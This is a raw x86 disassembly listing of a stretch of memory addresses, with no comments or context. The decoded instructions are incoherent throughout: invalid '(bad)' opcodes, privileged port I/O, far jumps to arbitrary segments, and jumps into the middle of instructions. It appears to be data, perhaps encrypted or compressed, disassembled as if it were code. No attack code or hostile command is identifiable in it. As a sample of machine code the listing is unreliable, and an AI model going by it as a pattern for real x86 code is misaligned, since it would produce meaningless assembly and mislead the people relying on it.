  41119f:	jle    0x411170
  4111a1:	cmp    eax,0x24dc21c2
  4111a6:	adc    al,0xf5
  4111a8:	xlat   BYTE PTR ds:[ebx]
  4111a9:	cli    
  4111aa:	ins    BYTE PTR es:[edi],dx
  4111ab:	push   ds
  4111ac:	jo     0x41116a
  4111ae:	push   0x2c
  4111b0:	or     ecx,ebx
  4111b2:	(bad)  
  4111b4:	loopne 0x41121f
  4111b6:	enter  0xc2b0,0xfd
  4111ba:	and    eax,0x32f280fa
  4111bf:	xor    eax,0xe9eeb828
  4111c4:	out    dx,eax
  4111c5:	mov    eax,0xbbbc5c56
  4111ca:	adc    al,dl
  4111cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111cd:	push   ds
  4111ce:	mov    ebx,0x82652197
  4111d3:	add    DWORD PTR [eax],0xffffff9c
  4111d6:	sahf   
  4111d7:	push   ds
  4111d8:	ds push esp
  4111da:	jae    0x411211
  4111dc:	repz and BYTE PTR [edi-0xc209379],ah
  4111e3:	out    0x1e,al
  4111e5:	nop
  4111e6:	iret   
  4111e7:	adc    al,0xb6
  4111e9:	repnz scas al,BYTE PTR es:[edi]
  4111eb:	mov    WORD PTR [esi+edx*1-0x4b],?
  4111ef:	inc    esp
  4111f0:	jb     0x41120f
  4111f2:	ficomp WORD PTR [eax]
  4111f4:	enter  0x26e4,0xa
  4111f8:	inc    edi
  4111f9:	xchg   DWORD PTR [esi+0x101246c4],eax
  4111ff:	frstor [ebx+ebp*4]
  411202:	cmp    esp,DWORD PTR [ebx+0x7f]
  411205:	xchg   DWORD PTR [eax],edx
  411207:	cmp    esp,DWORD PTR [eax+0x1b216dde]
  41120d:	or     al,0x2a
  41120f:	std    
  411210:	jl     0x4111d0
  411212:	cld    
  411213:	push   edx
  411214:	mov    eax,0x7f325e85
  411219:	sbb    BYTE PTR [esi-0x7c6dbea],al
  41121f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411220:	cmp    BYTE PTR [eax-0x6c496fbe],ch
  411226:	gs adc bl,dh
  411229:	sar    cl,1
  41122b:	sbb    DWORD PTR [ebx],edi
  41122d:	fnstenv [esp+ecx*8+0x53]
  411231:	xor    al,0x99
  411233:	mov    bh,0x9b
  411235:	fild   DWORD PTR [esi+eax*2+0x7]
  411239:	sub    eax,0xaef5d8a2
  41123e:	jge    0x4111d0
  411240:	neg    BYTE PTR [edi]
  411242:	ror    DWORD PTR [eax-0x7a],1
  411245:	add    ecx,DWORD PTR [edi-0x7e]
  411248:	fcomp  DWORD PTR [ebx]
  41124a:	mov    esi,0x234615b3
  41124f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411250:	loope  0x4111e6
  411252:	mov    ds:0x2d947508,al
  411257:	int    0x65
  411259:	adc    eax,0x1cc17a5
  41125e:	xor    BYTE PTR [edx+esi*4+0x49d5ac70],bl
  411265:	push   ebp
  411266:	cdq    
  411267:	repz mov ebp,0x6a942ab2
  41126d:	dec    ecx
  41126e:	mov    ecx,0x24f7f030
  411273:	jmp    0xf6e2:0x8365904f
  41127a:	mov    ?,edi
  41127c:	or     eax,0xed2f2f38
  411281:	pop    esi
  411282:	sub    edx,ebp
  411284:	xlat   BYTE PTR ds:[ebx]
  411285:	arpl   WORD PTR [edi],si
  411287:	gs stos DWORD PTR es:[edi],eax
  411289:	jl     0x411290
  41128b:	push   edx
  41128c:	clc    
  41128d:	or     al,0x2f
  41128f:	mov    ebx,DWORD PTR [esi+0x924f1af]
  411295:	jecxz  0x4112b8
  411297:	adc    edx,esp
  411299:	test   BYTE PTR [esi],al
  41129b:	and    edx,DWORD PTR [ecx+0x62b4ac7]
  4112a1:	dec    ebx
  4112a2:	xor    BYTE PTR [edi+ebx*2+0x7e2f462a],0x49
  4112aa:	jb     0x4112ba
  4112ac:	repz push esi
  4112ae:	test   BYTE PTR [ebp+esi*2-0x4664e680],bl
  4112b5:	adc    ch,cl
  4112b7:	jmp    0xc406:0x8647457b
  4112be:	daa    
  4112bf:	xor    ebx,edx
  4112c1:	jo     0x411246
  4112c3:	pop    ds
  4112c4:	pop    ecx
  4112c5:	mov    ch,0xc4
  4112c7:	stc    
  4112c8:	dec    ebx
  4112c9:	mov    al,ds:0xb53456e0
  4112ce:	cmp    esp,DWORD PTR [ebx-0x55638255]
  4112d4:	(bad)  
  4112d5:	int3   
  4112d6:	or     al,0x20
  4112d8:	es enter 0xad3f,0x25
  4112dd:	jns    0x411306
  4112df:	ss jno 0x4112f8
  4112e2:	shr    DWORD PTR [edi+eax*4],cl
  4112e5:	mov    ebx,0xdecf1df9
  4112ea:	jns    0x41131d
  4112ec:	mov    ebx,0x9985ac13
  4112f1:	inc    eax
  4112f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112f3:	aas    
  4112f4:	scas   eax,DWORD PTR es:[edi]
  4112f5:	xor    edx,DWORD PTR [ebx+0x70]
  4112f8:	test   al,bl
  4112fa:	dec    edx
  4112fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112fc:	sbb    eax,0x6aa593e6
  411301:	push   edx
  411302:	inc    ebp
  411303:	inc    esp
  411304:	cs dec ebx
  411306:	sbb    edx,esi
  411308:	dec    eax
  411309:	mov    edi,0x899070b9
  41130e:	jo     0x4112b8
  411310:	cmp    DWORD PTR [edx-0x1b],ecx
  411313:	ja     0x41134f
  411315:	ror    ecx,0xb4
  411318:	jno    0x4112fd
  41131a:	jo     0x41133e
  41131c:	jb     0x4112d2
  41131e:	retf   
  41131f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411320:	push   0x45343608
  411325:	repz mov dl,0xa8
  411328:	or     ebx,edi
  41132a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41132b:	mov    cl,0xe4
  41132d:	jle    0x411301
  41132f:	mov    ds:0x889d7d00,al
  411334:	shl    DWORD PTR [ecx-0x234df8b],cl
  41133a:	adc    DWORD PTR ds:0xfc2f595d,ebp
  411340:	jnp    0x41137c
  411342:	dec    esp
  411343:	in     al,dx
  411344:	(bad)  
  411345:	in     al,dx
  411346:	call   0xe34370a
  41134b:	pop    eax
  41134c:	push   cs
  41134d:	aaa    
  41134e:	fadd   QWORD PTR [edx]
  411350:	jne    0x41132d
  411352:	sbb    eax,0x5de478eb
  411357:	dec    ecx
  411358:	pop    edi
  411359:	setg   BYTE PTR [ecx+0x491ca41d]
  411360:	mov    edi,eax
  411362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411363:	lahf   
  411364:	scas   eax,DWORD PTR es:[edi]
  411365:	sti    
  411366:	in     eax,0x82
  411368:	jne    0x411377
  41136a:	sbb    eax,0x7ee55227
  41136f:	cwde   
  411370:	jmp    0xdf88:0x3f3a04d1
  411377:	jg     0x411328
  411379:	mov    dl,0xd
  41137b:	daa    
  41137c:	sbb    BYTE PTR [ebx+0x6f0554c6],dh
  411382:	aam    0x6b
  411384:	test   al,0x7b
  411386:	push   eax
  411387:	retf   0x1f3f
  41138a:	inc    esp
  41138b:	(bad)  
  41138c:	adc    eax,0x6e0e169f
  411391:	xchg   edi,eax
  411392:	mov    ch,0x6d
  411394:	in     al,0x4f
  411396:	mov    ecx,0xcfa7e547
  41139b:	lock retf 
  41139d:	sbb    al,0x8b
  41139f:	xchg   ecx,eax
  4113a0:	mov    ah,0xef
  4113a2:	lahf   
  4113a3:	sbb    cl,0x36
  4113a6:	pop    edx
  4113a7:	(bad)  
  4113a8:	scas   eax,DWORD PTR es:[edi]
  4113a9:	es jne 0x411396
  4113ac:	cwde   
  4113ad:	es xchg ebp,eax
  4113af:	sub    DWORD PTR [ebp-0x5a],0x7422b011
  4113b6:	sub    al,0x1b
  4113b8:	mov    bh,BYTE PTR [ebx-0x9]
  4113bb:	call   0x609b6bac
  4113c0:	adc    BYTE PTR [eax],bl
  4113c2:	cmp    eax,0x751b1e45
  4113c7:	mov    DWORD PTR [ecx-0x15],edx
  4113ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113cb:	retf   
  4113cc:	hlt    
  4113cd:	es adc ebx,esi
  4113d0:	dec    edi
  4113d1:	inc    ebp
  4113d2:	pop    edx
  4113d3:	ins    WORD PTR es:[edi],dx
  4113d5:	outs   dx,BYTE PTR ds:[esi]
  4113d6:	push   esi
  4113d7:	inc    eax
  4113d8:	add    esp,DWORD PTR [ecx]
  4113da:	mov    ah,0x40
  4113dc:	outs   dx,BYTE PTR ds:[esi]
  4113dd:	in     eax,0xd1
  4113df:	mov    BYTE PTR [edx+0x72],al
  4113e2:	jl     0x411446
  4113e4:	sbb    esp,ebx
  4113e6:	mov    DWORD PTR [eax-0x54],esi
  4113e9:	fwait
  4113ea:	push   0x68
  4113ec:	icebp  
  4113ed:	cli    
  4113ee:	sub    esi,DWORD PTR [ebp+0x53]
  4113f1:	les    esp,FWORD PTR [esi+0x2176429e]
  4113f7:	add    BYTE PTR [eax-0x1c],ah
  4113fa:	mov    edi,0xb92c56d3
  4113ff:	mov    cl,0x42
  411401:	sbb    al,0x2e
  411403:	mov    esp,0x89955830
  411408:	icebp  
  411409:	(bad)  
  41140a:	gs aad 0x5b
  41140d:	xchg   ebp,eax
  41140e:	mov    al,0x13
  411410:	push   0x776414a4
  411415:	and    al,0x2f
  411417:	and    BYTE PTR [edx-0x45c7611],cl
  41141d:	sti    
  41141e:	fidiv  DWORD PTR [edx]
  411420:	bound  edx,QWORD PTR [eax]
  411422:	push   ds
  411423:	push   cs
  411424:	sub    BYTE PTR [edx+eiz*1+0x21200d2e],ch
  41142b:	or     BYTE PTR [ebx+0x5],bh
  41142e:	adc    esi,DWORD PTR [ebx-0x38]
  411431:	into   
  411432:	imul   edx,edx,0xb
  411435:	cmp    ecx,DWORD PTR [esi+0x4af7ab22]
  41143b:	aaa    
  41143c:	mov    WORD PTR [ecx+0x62d37c08],cs
  411442:	pop    ss
  411443:	mul    DWORD PTR [ecx+ebx*2+0x61]
  411447:	cmp    ah,bl
  411449:	scas   al,BYTE PTR es:[edi]
  41144a:	mov    ebp,0x3cc9bb58
  41144f:	mov    al,0x4a
  411451:	(bad)  
  411452:	or     edi,DWORD PTR [eax+edi*2-0x5]
  411456:	mov    ch,BYTE PTR [ebp+0x19]
  411459:	(bad)  
  41145a:	bound  eax,QWORD PTR [edx+0xe]
  41145d:	and    BYTE PTR [esi],ah
  41145f:	imul   ecx,DWORD PTR [ecx],0xc05d15ca
  411465:	sbb    al,0x2a
  411467:	mov    esi,0x161cc334
  41146c:	scas   eax,DWORD PTR es:[edi]
  41146d:	xlat   BYTE PTR ds:[ebx]
  41146e:	pop    ebx
  41146f:	xchg   esi,eax
  411470:	data16 jns 0x41144f
  411473:	mov    eax,0x83f5a9bf
  411478:	lahf   
  411479:	push   esp
  41147a:	test   al,0xed
  41147c:	clc    
  41147d:	or     al,0x79
  41147f:	mov    al,BYTE PTR [ecx-0x4c7deca2]
  411485:	(bad)  
  411486:	repz push edx
  411488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411489:	push   0x63
  41148b:	mov    DWORD PTR [esi],ebp
  41148d:	pop    ss
  41148e:	into   
  41148f:	dec    esi
  411490:	jge    0x41144e
  411492:	jp     0x411436
  411494:	cmp    DWORD PTR [edi+0x291ba377],ebp
  41149a:	jl     0x411421
  41149c:	mov    ecx,0x5ccb4bc4
  4114a1:	inc    esp
  4114a2:	enter  0x8cd8,0xb1
  4114a6:	imul   eax,DWORD PTR [eax-0x3d],0x27ed3ff1
  4114ad:	pop    ds
  4114ae:	sbb    eax,0x7d8e2cbb
  4114b3:	fldenv [ecx+0x2fd8258d]
  4114b9:	pop    edx
  4114ba:	mov    eax,0xc63c1d14
  4114bf:	sti    
  4114c0:	jge    0x4114ad
  4114c2:	stc    
  4114c3:	mov    edi,0x628f271a
  4114c8:	cmp    DWORD PTR [edx+eiz*2+0x3],edx
  4114cc:	mov    al,0x1c
  4114ce:	stos   BYTE PTR es:[edi],al
  4114cf:	retf   0x4815
  4114d2:	aaa    
  4114d3:	xchg   edx,eax
  4114d4:	aam    0xe1
  4114d6:	call   0x3a6300f8
  4114db:	sbb    al,0xb2
  4114dd:	jo     0x4114a8
  4114df:	mov    edi,0x3805a7db
  4114e4:	sub    BYTE PTR [esi],ch
  4114e6:	cwde   
  4114e7:	jg     0x4114b8
  4114e9:	xor    BYTE PTR [esi+0x44ce6201],0xa8
  4114f0:	push   eax
  4114f1:	into   
  4114f2:	leave  
  4114f3:	fimul  WORD PTR [edi]
  4114f5:	ror    BYTE PTR [edi],0xe2
  4114f8:	jmp    0x4114e5
  4114fa:	sbb    al,0x32
  4114fc:	data16 into 
  4114fe:	fadd   QWORD PTR [edi-0x2d]
  411501:	imul   edx,DWORD PTR [edx],0xd725d8df
  411507:	push   0x4d8b0510
  41150c:	aaa    
  41150d:	(bad)  
  41150e:	fst    QWORD PTR [edx-0x58b01315]
  411514:	pushf  
  411515:	add    eax,0x2f0936cf
  41151a:	stos   BYTE PTR es:[edi],al
  41151b:	fsubr  DWORD PTR [esi-0x59]
  41151e:	call   0xf14f:0x7829b64a
  411525:	data16 mov ?,WORD PTR [ebp+0x785ecb0f]
  41152c:	(bad)  
  41152d:	js     0x411533
  41152f:	pop    ebx
  411530:	outs   dx,BYTE PTR ds:[esi]
  411531:	test   eax,0x2cf11110
  411536:	lods   eax,DWORD PTR ds:[esi]
  411537:	fcom   DWORD PTR [edx]
  411539:	pop    ds
  41153a:	es ins BYTE PTR es:[edi],dx
  41153c:	outs   dx,BYTE PTR ds:[esi]
  41153d:	mov    dl,0xfb
  41153f:	sbb    BYTE PTR [edx+edi*2+0x23b759d8],0x59
  411547:	imul   eax,DWORD PTR [eax],0x52e6949f
  41154d:	mov    cl,0xaa
  41154f:	inc    edx
  411550:	xchg   ebp,eax
  411551:	adc    esp,DWORD PTR [ebp+0x16]
  411554:	call   0xd32b:0xef93a694
  41155b:	or     BYTE PTR [ebx*8-0x13954815],0x0
  411563:	pop    edx
  411564:	cmp    edx,ebp
  411566:	and    BYTE PTR [edx+ebp*1-0x41],ch
  41156a:	gs (bad) 
  41156c:	sar    BYTE PTR [edi-0x23ddf1ac],1
  411572:	out    0x13,eax
  411574:	out    0x7d,al
  411576:	lods   al,BYTE PTR ds:[esi]
  411577:	cmp    esp,DWORD PTR [ebp+0xde2fb1c]
  41157d:	aaa    
  41157e:	(bad)  
  41157f:	das    
  411580:	mov    cl,0x16
  411582:	dec    ecx
  411583:	(bad)  
  411584:	retf   0xcc48
  411587:	out    dx,eax
  411588:	nop
  411589:	int    0xa7
  41158b:	adc    BYTE PTR [ebx],ch
  41158d:	int    0x79
  41158f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411590:	ss (bad) 
  411593:	inc    edi
  411594:	out    dx,eax
  411595:	push   edi
  411596:	loope  0x411566
  411598:	popa   
  411599:	push   0x85ddc29b
  41159e:	ret    0xa5c0
  4115a1:	fwait
  4115a2:	sti    
  4115a3:	cdq    
  4115a4:	sbb    eax,0xe24ee5c8
  4115a9:	jl     0x411553
  4115ab:	dec    ecx
  4115ac:	sub    ah,BYTE PTR [eax-0x5643ac44]
  4115b2:	sub    al,0x7
  4115b4:	popf   
  4115b5:	xchg   ecx,eax
  4115b6:	mov    ch,0xf6
  4115b8:	ret    
  4115b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115ba:	imul   ecx,DWORD PTR [ebx-0x78726725],0x64
  4115c1:	ret    
  4115c2:	add    eax,0x7a49b06
  4115c7:	es ss test al,0x7
  4115cb:	arpl   WORD PTR [esi-0x5c4d5118],dx
  4115d1:	or     al,0xda
  4115d3:	cdq    
  4115d4:	into   
  4115d5:	sbb    BYTE PTR [eax],al
  4115d7:	enter  0x8785,0x90
  4115db:	jmp    0x5ce1:0x9900e316
  4115e2:	dec    esp
  4115e3:	add    edx,DWORD PTR [ecx+ebp*1+0x5733565b]
  4115ea:	nop
  4115eb:	pushf  
  4115ec:	aaa    
  4115ed:	adc    al,0x26
  4115ef:	and    ecx,DWORD PTR [ebx]
  4115f1:	loop   0x41163b
  4115f3:	lods   al,BYTE PTR ds:[esi]
  4115f4:	push   esp
  4115f5:	jge    0x411642
  4115f7:	in     eax,0xd7
  4115f9:	dec    ebx
  4115fa:	or     edx,DWORD PTR [edx-0x9689f45]
  411600:	inc    eax
  411601:	and    al,0x75
  411603:	and    al,0x4e
  411605:	inc    esp
  411606:	enter  0x159f,0x11
  41160a:	clc    
  41160b:	call   0x1dd4e1c2
  411610:	fstp   TBYTE PTR [eax-0x118733d4]
  411616:	sbb    DWORD PTR [esi+0x1c],ebp
  411619:	sub    eax,0x596ac473
  41161e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41161f:	mov    al,ds:0xccf3d8e9
  411624:	pop    esi
  411625:	mov    ch,0xaa
  411627:	aas    
  411628:	jae    0x411629
  41162a:	cmc    
  41162b:	jns    0x4115e4
  41162d:	popf   
  41162e:	mov    BYTE PTR [esi+0x78],dl
  411631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411632:	push   cs
  411633:	ins    DWORD PTR es:[edi],dx
  411634:	data16 add al,0xcd
  411637:	pop    ebp
  411638:	hlt    
  411639:	xor    ebx,DWORD PTR [esp+ebx*8-0x46]
  41163d:	scas   eax,DWORD PTR es:[edi]
  41163e:	mov    ebp,0xdde54eb5
  411643:	sub    BYTE PTR [edx],dl
  411645:	add    al,0x4f
  411647:	sub    esi,DWORD PTR [esi*1-0xaaa64b8]
  41164e:	(bad)  
  41164f:	repnz cdq 
  411651:	and    eax,0x58a8f525
  411656:	inc    edx
  411657:	jbe    0x411651
  411659:	jno    0x41162b
  41165b:	push   edi
  41165c:	retf   
  41165d:	pop    esi
  41165e:	call   DWORD PTR [ebx]
  411660:	and    al,0x98
  411662:	fiadd  WORD PTR [esi+0xe1cf3fe]
  411668:	cmc    
  411669:	test   BYTE PTR [ebx+eax*8],ah
  41166c:	mov    dh,ch
  41166e:	add    dh,ch
  411670:	inc    edx
  411671:	sub    DWORD PTR [edx-0x4a7ec2ef],0xb04af943
  41167b:	cdq    
  41167c:	sub    DWORD PTR [esi+edi*2+0x2dff1543],0xffffffdf
  411684:	test   DWORD PTR [esi+esi*4+0x31],esi
  411688:	sti    
  411689:	pop    esp
  41168a:	dec    esp
  41168b:	xor    ebx,DWORD PTR [ecx-0x7c]
  41168e:	ss out dx,eax
  411690:	adc    eax,0x6438a870
  411695:	or     al,0x34
  411697:	inc    esi
  411698:	dec    esi
  411699:	mov    eax,0x99f51ebc
  41169e:	inc    ecx
  41169f:	js     0x41162b
  4116a1:	jge    0x4116e3
  4116a3:	cli    
  4116a4:	addr16 sbb eax,0x2a0f2bcf
  4116aa:	inc    edx
  4116ab:	and    DWORD PTR [eax],esi
  4116ad:	shl    BYTE PTR [edi-0x2bd86909],0xa1
  4116b4:	xlat   BYTE PTR ds:[ebx]
  4116b5:	jl     0x4116d4
  4116b7:	cmp    esi,DWORD PTR [ecx+ebp*4-0x17b199f7]
  4116be:	cld    
  4116bf:	aam    0x31
  4116c1:	add    al,0x64
  4116c3:	cmp    bl,al
  4116c5:	pop    edi
  4116c6:	std    
  4116c7:	sub    BYTE PTR ds:0xf7507e88,cl
  4116cd:	out    dx,al
  4116ce:	cmp    ebx,ecx
  4116d0:	mov    dh,0x92
  4116d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116d3:	ins    BYTE PTR es:[edi],dx
  4116d4:	in     eax,0x46
  4116d6:	repnz mov bh,0xc9
  4116d9:	mov    WORD PTR [edi-0x3d9aee78],?
  4116df:	jae    0x411727
  4116e1:	repnz rcl DWORD PTR [edi],cl
  4116e4:	inc    ebp
  4116e5:	push   cs
  4116e6:	sub    eax,0x6b04e655
  4116eb:	retf   
  4116ec:	cmp    dh,BYTE PTR [esi-0x3f]
  4116ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116f0:	cld    
  4116f1:	xor    BYTE PTR [eax],cl
  4116f3:	push   0x76
  4116f5:	leave  
  4116f6:	mov    bx,0x635a
  4116fa:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116fc:	mov    ebx,0x9acd3acc
  411701:	push   esi
  411702:	ret    
  411703:	xor    ebp,esp
  411705:	jo     0x4116ba
  411707:	das    
  411708:	jmp    0x411778
  41170a:	ins    DWORD PTR es:[edi],dx
  41170b:	cmp    ah,BYTE PTR [ebp-0x6e5acc65]
  411711:	push   es
  411712:	jecxz  0x41173a
  411714:	sbb    al,0x2a
  411716:	scas   eax,DWORD PTR es:[edi]
  411717:	xchg   esp,eax
  411718:	and    eax,0x6117b84d
  41171d:	rcl    BYTE PTR [esi],cl
  41171f:	fmul   DWORD PTR [edx]
  411721:	adc    DWORD PTR [edx],ecx
  411723:	out    dx,eax
  411724:	jg     0x41177c
  411726:	das    
  411727:	arpl   WORD PTR [ecx+0x645c71d6],sp
  41172d:	in     eax,0x3d
  41172f:	inc    ebp
  411730:	cmp    eax,esi
  411732:	mov    ecx,0x19996605
  411737:	push   edi
  411738:	sub    eax,0x698e8e76
  41173d:	aas    
  41173e:	and    dh,BYTE PTR [edx+esi*1]
  411741:	mov    bh,0x82
  411743:	fstp   DWORD PTR [edi+0x220c0d26]
  411749:	cdq    
  41174a:	adc    ch,BYTE PTR [esi]
  41174c:	cmp    BYTE PTR [ebp+0x47],bl
  41174f:	int    0x1a
  411751:	int3   
  411752:	fcmovnbe st,st(0)
  411754:	sbb    dl,ah
  411756:	xchg   BYTE PTR [esi],ah
  411758:	mov    eax,ds:0x86630bfb
  41175d:	mov    al,0x5c
  41175f:	jns    0x4117a8
  411761:	imul   edi,ebx,0x0
  411764:	fs ins DWORD PTR es:[edi],dx
  411766:	mov    fs,WORD PTR [ebp+0x2e]
  411769:	mov    dh,bh
  41176b:	xlat   BYTE PTR ds:[ebx]
  41176c:	dec    edi
  41176d:	outs   dx,BYTE PTR ds:[esi]
  41176e:	push   ecx
  41176f:	adc    DWORD PTR es:[eax+ecx*4+0x8],eax
  411774:	jmp    0xc8924d2d
  411779:	cmp    ch,ah
  41177b:	es push ds
  41177d:	mov    ebx,0x61715a31
  411782:	pop    ss
  411783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411784:	or     DWORD PTR [ebp+0x40514c17],esi
  41178a:	add    ebp,eax
  41178c:	out    0x79,al
  41178e:	or     eax,0xe1332af5
  411793:	imul   BYTE PTR [eax-0x53]
  411796:	push   esi
  411797:	ins    BYTE PTR es:[edi],dx
  411798:	pop    es
  411799:	mov    DWORD PTR [eax+0x2d40d7b3],ebx
  41179f:	(bad)  
  4117a0:	call   0xdd268d47
  4117a5:	imul   edi,esi,0xcfc3141c
  4117ab:	mov    esp,0x769b6f4
  4117b0:	lahf   
  4117b1:	psllw  mm2,QWORD PTR [edx]
  4117b4:	inc    esi
  4117b5:	scas   eax,DWORD PTR es:[edi]
  4117b6:	(bad)
  4117ba:	jle    0x411812
  4117bc:	sub    bh,BYTE PTR [ebx+0x551bb153]
  4117c2:	lods   al,BYTE PTR ds:[esi]
  4117c3:	out    dx,al
  4117c4:	loope  0x411763
  4117c6:	mov    eax,ds:0x52c3209e
  4117cb:	inc    edx
  4117cc:	pop    ebp
  4117cd:	and    ebp,DWORD PTR [eax+0x64b52ae3]
  4117d3:	test   eax,0x7dd1221e
  4117d8:	cdq    
  4117d9:	and    ch,ah
  4117db:	and    BYTE PTR [edx],al
  4117dd:	(bad)  
  4117de:	sbb    BYTE PTR [edi],al
  4117e0:	cmc    
  4117e1:	ret    
  4117e2:	stc    
  4117e3:	dec    ebp
  4117e4:	test   DWORD PTR [ebp-0x4a],ebp
  4117e7:	sti    
  4117e8:	xchg   ebp,eax
  4117e9:	xchg   edx,eax
  4117ea:	pop    ss
  4117eb:	jg     0x4117c3
  4117ed:	pop    edi
  4117ee:	cmc    
  4117ef:	punpckhdq mm7,QWORD PTR [edi-0x2c4bf101]
  4117f6:	mov    ah,0xf8
  4117f8:	fcom   QWORD PTR [eax]
  4117fa:	sar    BYTE PTR [ebx-0xd],0x41
  4117fe:	xchg   ebx,eax
  4117ff:	mov    ch,0xc7
  411801:	add    al,0xae
  411803:	jmp    0x41179d
  411805:	cmp    al,0xe6
  411807:	jmp    0x4117bf
  411809:	jne    0x41180d
  41180b:	enter  0x860c,0xee
  41180f:	cmp    ecx,DWORD PTR [ebx+esi*2-0x477d65ad]
  411816:	nop
  411817:	dec    esi
  411818:	nop
  411819:	push   esp
  41181a:	jb     0x41186a
  41181c:	nop    DWORD PTR [esi+edi*1+0x2e]
  411821:	mov    al,ds:0xa806168
  411826:	test   eax,0x9cd4df92
  41182b:	or     dh,BYTE PTR [esi]
  41182d:	pop    ebx
  41182e:	push   es
  41182f:	call   0xb07587ec
  411834:	test   BYTE PTR [ecx],al
  411836:	mov    ah,0x7b
  411838:	fstp   DWORD PTR [edx+0x17]
  41183b:	ins    DWORD PTR es:[edi],dx
  41183c:	push   0x6c
  41183e:	test   DWORD PTR [eax+0x122e5c53],esi
  411844:	mov    esp,0x7bcce0d9
  411849:	adc    al,0x59
  41184b:	gs sti 
  41184d:	push   esp
  41184e:	icebp  
  41184f:	(bad)  
  411850:	(bad)  
  411851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411852:	jnp    0x4118bd
  411854:	push   ebx
  411855:	dec    edx
  411856:	mov    ?,WORD PTR [ecx+0x68]
  411859:	(bad)
  41185c:	jmp    0x4f8ec435
  411861:	ins    BYTE PTR es:[edi],dx
  411862:	sub    edx,DWORD PTR [ebx+0x474510bd]
  411868:	jns    0x4118c0
  41186a:	jle    0x411886
  41186c:	add    BYTE PTR ds:0xea51a6bd,ah
  411872:	fisttp WORD PTR [eax+0x35]
  411875:	iret   
  411876:	mov    ecx,0x5e8163a6
  41187b:	inc    edx
  41187c:	(bad)  
  41187d:	pushaw 
  41187f:	push   es
  411880:	fcom   DWORD PTR [eax]
  411882:	stos   DWORD PTR es:[edi],eax
  411883:	stc    
  411884:	dec    edx
  411885:	sub    DWORD PTR [edx+edi*1+0x0],esi
  411889:	mov    esi,0x5b8de276
  41188e:	fwait
  41188f:	push   edx
  411890:	pop    ds
  411891:	mov    cl,0x1b
  411893:	cli    
  411894:	call   FWORD PTR [ebp+0x194861e]
  41189a:	mov    DWORD PTR [edx-0x469af8d1],esi
  4118a0:	jo     0x411879
  4118a2:	out    0xbb,al
  4118a4:	dec    esp
  4118a5:	test   al,0x3b
  4118a7:	loop   0x41187b
  4118a9:	rcr    DWORD PTR [eax-0x26],0x61
  4118ad:	jecxz  0x411895
  4118af:	xchg   ecx,eax
  4118b0:	pusha  
  4118b1:	sub    cl,bl
  4118b3:	inc    ebx
  4118b4:	hlt    
  4118b5:	shl    eax,0x63
  4118b8:	sub    dh,BYTE PTR [eax-0x7d]
  4118bb:	and    BYTE PTR [ebx],bh
  4118bd:	pop    edx
  4118be:	adc    BYTE PTR [esi-0x4c],dl
  4118c1:	(bad)  
  4118c2:	nop
  4118c3:	cmp    edi,DWORD PTR [edi-0x3bd44501]
  4118c9:	dec    esp
  4118ca:	aas    
  4118cb:	je     0x411882
  4118cd:	mov    edx,0x9f5aee60
  4118d2:	xchg   esp,eax
  4118d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118d4:	pop    edx
  4118d5:	xchg   ebp,eax
  4118d6:	outs   dx,DWORD PTR ds:[esi]
  4118d7:	loop   0x411862
  4118d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118da:	pop    ds
  4118db:	jbe    0x4118ff
  4118dd:	and    BYTE PTR [ebx+edx*8],bl
  4118e0:	icebp  
  4118e1:	mov    DWORD PTR [ebx-0x35ce79bd],ebx
  4118e7:	loopne 0x41188e
  4118e9:	es pop es
  4118eb:	or     edi,edx
  4118ed:	sbb    al,bh
  4118ef:	maskmovq mm4,mm1
  4118f2:	mov    edi,DWORD PTR [edx-0x1d]
  4118f5:	not    al
  4118f7:	jl     0x4118cc
  4118f9:	test   eax,0x58ecef13
  4118fe:	nop
  4118ff:	(bad)  
  411900:	out    dx,al
  411901:	adc    BYTE PTR ds:0x249ea5f3,dl
  411907:	xchg   edi,eax
  411908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411909:	test   eax,0x5b7822f9
  41190e:	cmp    eax,0xa5f3ff17
  411913:	pop    ss
  411914:	mov    ch,0xb3
  411916:	xor    eax,0x40434d94
  41191b:	cdq    
  41191c:	fimul  WORD PTR [esi+0x7b13e794]
  411922:	or     ch,cl
  411924:	adc    ah,al
  411926:	sub    bh,BYTE PTR [ebp-0x49]
  411929:	cmp    DWORD PTR [esi],edi
  41192b:	mov    esp,0x1e2296d7
  411930:	je     0x4118b4
  411932:	push   esi
  411934:	ror    BYTE PTR ds:[eax],cl
  411937:	es add bl,ah
  41193a:	fs or  al,0x2c
  41193e:	push   esp
  41193f:	pop    ebp
  411940:	jl     0x41193f
  411942:	inc    edx
  411943:	or     DWORD PTR [ecx-0x186a8843],ebx
  411949:	stc    
  41194a:	std    
  41194b:	cmc    
  41194c:	lods   eax,DWORD PTR cs:[esi]
  41194e:	mov    esi,0x23817fd7
  411953:	dec    ebp
  411954:	pop    es
  411955:	fistp  QWORD PTR [esp+ebp*8-0x59]
  411959:	mov    ebx,0x19048a07
  41195e:	xor    ah,BYTE PTR [ecx+edi*8+0x1d]
  411962:	pusha  
  411963:	pop    ds
  411964:	inc    edx
  411965:	mov    bl,cl
  411967:	fidivr WORD PTR [edi+0xf]
  41196a:	add    DWORD PTR [edx],edi
  41196c:	fmul   DWORD PTR [ebp-0xc]
